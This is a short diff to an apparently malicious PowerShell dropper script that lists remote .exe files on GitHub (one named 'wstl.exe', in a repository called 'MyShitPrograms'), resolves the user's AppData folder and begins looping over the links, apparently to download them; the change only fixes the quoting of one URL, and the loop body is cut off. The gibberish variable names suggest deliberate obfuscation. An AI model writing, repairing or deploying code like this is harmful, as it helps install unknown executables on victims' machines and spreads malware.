@@ -1,6 +1,6 @@
 $gfgff = @(
     "https://github.com/dfgsgsdfgfd/test/raw/refs/heads/main/123.exe",
-https://github.com/JqrkaSt3al/MyShitPrograms/raw/refs/heads/main/wstl.exe
+"https://github.com/JqrkaSt3al/MyShitPrograms/raw/refs/heads/main/wstl.exe"
 )
 $dfsgsfdg = [Environment]::GetFolderPath('ApplicationData')
 foreach ($link in $gfgff) {
